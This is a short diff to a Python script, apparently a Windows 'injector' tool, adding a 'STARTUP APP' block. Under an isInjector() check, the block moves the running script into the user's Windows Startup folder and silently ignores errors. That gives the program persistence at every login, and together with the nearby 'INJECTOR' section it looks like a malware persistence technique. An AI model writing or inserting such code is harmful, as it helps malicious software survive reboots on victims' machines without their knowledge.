@@ -475,7 +475,22 @@ def __main__():
         bcolors.WHITE
         __main__()
         
-            
+        
+        
+#!# -----------------------------------STARTUP APP----------------------------------- #!#    
+
+if isInjector() == 1 or isInjector() == 5:
+    import shutil
+    import sys 
+    import getpass
+    
+    USER_NAME = getpass.getuser()
+    Src = (sys.argv[0])
+    Dest = r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % USER_NAME
+    try:
+        shutil.move(Src, Dest)
+    except:
+        pass        
 #!# -----------------------------------INJECTOR----------------------------------- #!#
 
 if isInjector() == 1:
@@ -525,6 +540,8 @@ printlogo()
 __main__()
 
 print(bcolors.WHITE)
+
+
 
 
 
